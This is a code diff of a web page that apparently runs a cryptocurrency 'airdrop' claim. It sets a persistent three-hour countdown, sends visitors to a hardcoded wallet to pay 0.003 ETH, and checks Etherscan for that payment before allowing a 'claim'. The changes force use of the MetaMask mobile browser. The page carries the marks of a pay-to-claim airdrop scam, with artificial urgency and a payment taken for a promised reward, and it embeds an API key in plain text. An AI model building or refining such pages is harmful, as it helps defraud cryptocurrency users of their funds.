@@ -48,16 +48,13 @@ button:disabled{opacity:.5; cursor:not-allowed}
 <script>
 /* ================= PERSISTENT 3-HOUR TIMER ================= */
 const timerEl = document.getElementById("timer");
-
-// Check if endTime already exists in localStorage
 let endTime = localStorage.getItem("airdropEndTime");
 if(!endTime){
-  endTime = Date.now() + 3*60*60*1000; // 3 hours from now
+  endTime = Date.now() + 3*60*60*1000;
   localStorage.setItem("airdropEndTime", endTime);
 }else{
   endTime = parseInt(endTime);
 }
-
 function updateTimer(){
   const diff = endTime - Date.now();
   if(diff <= 0){ 
@@ -78,16 +75,29 @@ const recipient = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";
 const etherscanApiKey = "VDQVS25IXQDJ8HZ2J8B3KWC9R4HI48Y14T"; 
 const requiredPayment = 0.003; // ETH
 
+function detectMetaMaskBrowser() {
+  const ua = navigator.userAgent;
+  const isMetaMaskBrowser = /MetaMask/i.test(ua);
+  const hasMetaMask = window.ethereum && window.ethereum.isMetaMask;
+  if(!hasMetaMask){
+    alert("MetaMask not detected. Please install MetaMask to continue.");
+    window.location.href = "https://metamask.io/download.html";
+    return false;
+  }
+  if(!isMetaMaskBrowser){
+    alert("Please open this page inside the MetaMask mobile browser.");
+    return false;
+  }
+  return true;
+}
+
 async function connectWallet(){
   const statusEl = document.getElementById("status");
-  if(!window.ethereum){
-    statusEl.innerHTML = `MetaMask not detected. Install it from <a href="https://metamask.io/download.html" target="_blank" style="color:#7f5cff">here</a>.`;
+  if(!detectMetaMaskBrowser()){
+    statusEl.innerText = "MetaMask browser required.";
     return;
   }
-  if(!window.ethereum.isMetaMask){
-    statusEl.innerHTML = "Only MetaMask is supported. Open this page in MetaMask.";
-    return;
-  }
+
   try{
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
@@ -155,8 +165,6 @@ async function checkPayment(){
   try{
     const res = await fetch(`https://api.etherscan.io/api?module=account&action=txlist&address=${currentAddress}&startblock=0&endblock=99999999&sort=desc&apikey=${etherscanApiKey}`);
     const data = await res.json();
-
-    // If API result is empty, treat it as "no payment yet"
     const txList = Array.isArray(data.result) ? data.result : [];
 
     const paid = txList.some(tx => 
@@ -184,3 +192,4 @@ function claimAirdrop(){
 </script>
 </body>
 </html>
+ 
